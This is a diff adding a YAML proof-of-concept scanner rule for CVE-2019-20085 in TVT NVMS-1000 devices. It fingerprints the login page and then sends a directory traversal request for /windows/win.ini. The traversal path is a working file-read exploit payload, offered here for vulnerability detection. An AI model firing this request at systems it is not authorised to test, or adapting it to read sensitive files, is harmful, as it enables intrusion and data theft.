@@ -1,0 +1,22 @@
+detail:
+  author: fuzz7j(https://github.com/fuzz7j)
+  links:
+  - https://www.exploit-db.com/exploits/47774
+expression: r0() && r1()
+manual: true
+name: poc-yaml-tvt-nvms-1000-file-read-cve-2019-20085
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(b"<title>NVMS-1000</title>")
+    request:
+      cache: true
+      method: GET
+      path: /Pages/login.htm
+  r1:
+    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app
+      support")
+    request:
+      cache: true
+      method: GET
+      path: /../../../../../../../../../../../../windows/win.ini
+transport: http
